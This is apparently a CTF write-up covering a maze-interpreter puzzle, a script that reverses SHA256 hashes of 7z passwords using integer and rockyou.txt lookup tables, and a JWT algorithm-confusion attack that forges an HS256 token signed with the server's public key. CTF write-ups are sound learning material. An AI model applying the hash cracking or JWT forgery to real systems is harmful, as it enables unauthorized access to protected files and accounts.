# Coding 1 - Jumpyrinth

The rules for this game were rather straightforward. Slightly confusing was the fact that there were around 130 start symbols, but by trying all of them and discarding the ones that didn't terminate, I could quickly discover the flag {FLG:H4ckItUpH4ckItInL33tM3B3g1n}.

```python
#!/usr/bin/env python3

DIR_RIGHT = 0
DIR_LEFT = 1
DIR_TOP = 2
DIR_BOT = 3


class Board:
    def __init__(self, board):
        self.board = board
        self.width = len(board[0]) - 1 # Hack, don't count newline
        self.height = len(board)

    def get_char(self, x, y):
        return self.board[x][y]

    def is_digit(self, n):
        return n in "0123456789"

    def get_num(self, x, y, direc):
        if direc == DIR_RIGHT:
            mod_r = 1
            mod_b = 0
        elif direc == DIR_LEFT:
            mod_r = -1
            mod_b = 0
        elif direc == DIR_TOP:
            mod_r = 0
            mod_b = -1
        elif direc == DIR_BOT:
            mod_r = 0
            mod_b = 1
        else:
            print("ERR: UNKNOWN DIR")

        num = []
        pos_x = x
        pos_y = y
        while True:
            pos_x += mod_b
            pos_y += mod_r

            char = self.get_char(pos_x, pos_y)
            if self.is_digit(char):
                num.append(char)
            else:
                break

        if len(num) == 0:
            print("ERR: NO NUM AT EXPECTED POS: {} {}".format(x, y))
            return 0

        return int(''.join(num))




class Game:

    def __init__(self):
        with open('2c464e58-9121-11e9-aec5-34415dec71f2.txt', 'r') as rf:
            game = rf.readlines()

        self.board = Board(game)
        print('Board size: w{} h{}'.format(self.board.width, self.board.height))

        # There seem to multiple start symbols??!
        start_poss = []
        for x in range(self.board.height):
            for y in range(self.board.width):
                char = self.board.get_char(x, y)
                if char == '$':
                    start_poss.append((x, y))
        print('Found {} start symbols'.format(len(start_poss)))

        
        for sp in start_poss:
            x, y = sp
            print('\nTrying {}/{}'.format(x, y))

            self.stack = []
            self.flag = []
            self.run(x, y)

        #self.run(331, 455)


    def run(self, start_x, start_y):
        x = start_x
        y = start_y

        while True:
            char = self.board.get_char(x, y)
            print(char, end='')

            if char == '$':
                x += 1
            elif char == '@':
                flag = ''.join(self.flag)
                if flag.startswith('{FLG'):
                    print('\nDone - Flag: {}'.format(flag))
                    exit(0)
                else:
                    print('\nFinished without flag')
                    return
            elif char == '#':
                print('\nRun into #')
                exit(0)
            elif char == '(':
                self.flag.insert(0, self.stack.pop(0))
                num = self.board.get_num(x, y, DIR_RIGHT)
                if num == 0:
                    return
                y -= num
            elif char == ')':
                self.flag.append(self.stack.pop(0))
                num = self.board.get_num(x, y, DIR_LEFT)
                if num == 0:
                    return
                y += num
            elif char == '-':
                self.flag.pop(0)
                num = self.board.get_num(x, y, DIR_BOT)
                if num == 0:
                    return
                x -= num
            elif char == '+':
                self.flag.pop()
                num = self.board.get_num(x, y, DIR_TOP)
                if num == 0:
                    return
                x += num
            elif char == '%':
                self.flag = list(reversed(self.flag))
                x += 1
            elif char == '[':
                self.stack.insert(0, self.board.get_char(x, y+1))
                y += 2
            elif char == ']':
                self.stack.insert(0, self.board.get_char(x, y-1))
                y -= 2
            elif char == '*':
                self.stack.insert(0, self.board.get_char(x-1, y))
                x -= 2
            elif char == '.':
                self.stack.insert(0, self.board.get_char(x+1, y))
                x += 2
            elif char == '<':
                num = self.board.get_num(x, y, DIR_RIGHT)
                if num == 0:
                    return
                y -= num
            elif char == '>':
                num = self.board.get_num(x, y, DIR_LEFT)
                if num == 0:
                    return
                y += num
            elif char == '^':
                num = self.board.get_num(x, y, DIR_BOT)
                if num == 0:
                    return
                x -= num
            elif char == 'v':
                num = self.board.get_num(x, y, DIR_TOP)
                if num == 0:
                    return
                x += num
            else:
                print('\nWrong char: {}'.format(char))
                return


if __name__ == '__main__':
    Game()
```


# Coding 3 - Puzzle

In this challenge there were quite a lot of files given that were either

- a 7zip file with password
- a file containing a SHA256 hash of a password for a 7zip file that was either
	- A number from 0 - 3000000
	- A password from the first 3000000 entries of rockyou.txt

First step was to write a script to decrypt all files (which didn't work for some weird chinese multibyte chars with encoding errors in rockyou.txt whatever foo...). Anyway, here it is (the monster):

```python
#!/usr/bin/env python3

import os
from subprocess import run, check_output, PIPE, STDOUT
from hashlib import sha256


################
# Generate hashes for lookup
################

def hash(b):
    return sha256(b).hexdigest()


def gen_ints():
    table_ints = {}

    for nr in range(3000000):
        if nr % 1000 == 0:
            print('\r{}'.format(nr), end='')

        nr_bytes = str(nr).encode('ascii')
        h = hash(nr_bytes)
        table_ints[h] = nr_bytes

    print()
    return table_ints


def gen_rock():
    table_rock = {}

    with open('rockyou.txt', 'rb') as rf:
        rockyou = rf.read()

    print('Trimming rockyou...')
    
    # Cut at the 3.000.000th newline, oh geez...
    # CTF code as usual
    occurance = 0
    for i in range(len(rockyou)):
        if rockyou[i] == ord('\n'):
            occurance += 1
            if occurance == 3000000:
                rockyou = rockyou[0:i]
                print(len(rockyou))
                rockyou = rockyou.split(b'\n')
                print(len(rockyou))
                break

    print('Hashing rockyou...')

    for pw in rockyou:
        h = hash(pw)
        table_rock[h] = pw

    print('Hashing done!')
    return table_rock


table_ints = gen_ints()
table_rock = gen_rock()




###########
# Traverse dirs
###########

def get_keyfile_parts(text):
    return text.split(':')

TYPE_ZIP = 0
TYPE_TXT_INT = 1
TYPE_TXT_ROCK = 2

fpath = {}
ftype = {}
fkey = {}

num_zip = 0
num_int = 0
num_rock = 0


for dir_name, subdirs, files in os.walk('4568'):
    for name in files:
        filepath = dir_name + '/' + name

        if name in fpath:
            print('Duplicate file: {}'.format(fname))
            exit()

        fpath[name] = filepath

        with open(filepath, 'rb') as rf:
            file_content = rf.read()

        if b'FIRST3MINTEGERS' in file_content:
            ftype[name] = TYPE_TXT_INT
            num_int += 1

            c_file, c_origin, c_hash = tuple(get_keyfile_parts(file_content.decode('ascii')))

            if c_hash in table_ints:
                fkey[c_file] = table_ints[c_hash]
            else:
                print('Could not reverse hash: {}'.format(c_hash))

        elif b'FIRST3MROCKPASSWORDS' in file_content:
            ftype[name] = TYPE_TXT_ROCK
            num_rock += 1

            c_file, c_origin, c_hash = tuple(get_keyfile_parts(file_content.decode('ascii')))

            if c_hash in table_rock:
                fkey[c_file] = table_rock[c_hash]
            else:
                print('Could not reverse hash: {}'.format(c_hash))

        elif file_content[0:2] == b'7z':
            ftype[name] = TYPE_ZIP
            num_zip += 1

        else:
            print('Unknown file: {}'.format)


print('num 7zip: {}'.format(num_zip))
print('num FIRST3MINTEGERS: {}'.format(num_int))
print('num FIRST3MROCKPASSWORDS: {}'.format(num_rock))




################
# Do stuffy stuff
################

def extract_file(f):
    file_path = fpath[f]
    file_key = fkey[f]
    #try:
    #    res = check_output(['7z', 'x', '-p' + file_key.decode('utf-8'), '-opics', file_path], timeout=2).decode('utf-8')
    #except:
    #    return False
    #return 'Everything is Ok' in res

    try:
        p = run(['7z', 'x', '-opics', file_path], stdout=PIPE, input=file_key + b'\n', timeout=2)
    except:
        return False

    return p.returncode == 0 and 'Everything is Ok' in p.stdout.decode('utf8')


# Testing things...
print('Num 7z files | Num keys | Sets equal:')
seven_files = [v for v in ftype.keys() if ftype[v] == TYPE_ZIP]
print(len(seven_files))
print(len(fkey.keys()))
print(set(seven_files) == set(fkey.keys()))

files_without_key = [v for v in seven_files if v not in fkey]
print('Files without keys:')
for f in files_without_key:
    print(fpath[f])

#print('Test sample:')
#t = 'qphh7LxW-143'
#print(t)
#print(fkey[t])
#print(extract_file(t))


# Decrypt all the files
print('Decrypting files...')
for f in seven_files:
    if f in fkey:
        print('\rExtracting {}'.format(f))
        if not extract_file(f):
            print('Could not extract {}'.format(fpath[f]))
print('\nDone')
```

By examining the resulting pictures we found that some contained just random color pixels while others seemed to be part of a letter. From there it was just a matter of filtering out the "interesting" picture fragments (by checking for black borders) and putting them together in the right order by just sorting them by their appended number. The resulting "big picture" contained the flag.


# Web 2 - File Rover

Viewing the source code of the web page, I realized there is a file flag.txt that I really really really want to have. Unfortunately some dude deleted it and we don't have a JWT token for the download.php to get it. So why not create out own one?

Fortunately there is a known attack to trick the server into thinking the JWT token was symmetrically signed with the public key that was originally used for validating the asymmetrically signed token. And fortunately the server used the very same key for TLS. Nice! The attack then essentially follows a nice explanation from here:
https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

We get the server's public key:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqNyaO8jKmo/vfcFmxVNx
mJD4s+pJah9v/y7TxT1EGLLHZhAjZji7cZ+tyu5XDX6X9Mv3Cw5teQu9cdlTbdFp
rS9jRasnMlOfqI0V7jc7MOpa3n7AOeAYW9kFCL0qykKEs5B1f+F4zNAxp0hdE3eQ
KYCbCprXjHKF1CfH28C0Qk+GUtaRJbLaUybBoGvQ7vW/fdVUkuk3lOgnzF9dgrm0
8u11QLQpkF5glpC9ydiuWPNEKuOzTOGcgT3kA9XxliBLmuXO6OjDxxzzoDokMg82
rsQ9XQOE9E3MRF2THfeMyQW7lRO63DOPCM3OBboSlUJQxWFVlA+YbMMUU7G0LdFX
lQIDAQAB
-----END PUBLIC KEY-----
```

Create our modified payload (flag is a md5 sum) and base64 encode it:
```
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "filename": "159df48875627e2f7f66dae584c5e3a5"
}
```

And sign it with the public key: `gkPHJYEXF0WEpvwzI4FxDkFGoG6dpBvVMhq6ibsl28w`

The server is happy and returns a very fine flag.txt, so I'm happy, too.